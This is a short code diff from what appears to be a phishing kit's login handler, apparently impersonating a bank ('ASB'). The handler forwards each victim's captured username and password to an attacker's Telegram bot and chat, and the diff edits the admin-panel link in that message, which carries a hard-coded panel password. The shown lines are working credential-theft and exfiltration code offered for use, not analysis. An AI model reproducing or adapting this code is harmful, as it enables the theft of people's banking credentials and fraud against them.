@@ -57,7 +57,7 @@ const submitLogin = async (req, res) => {
 						`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
 						{
 							chat_id: 680379375,
-							text: `New ASB Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/?panel=asb&password=haytch4023`,
+							text: `New ASB Hit:\n\n${username}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=asb&password=haytch4023`,
 							parse_mode: "Markdown",
 						}
 					)
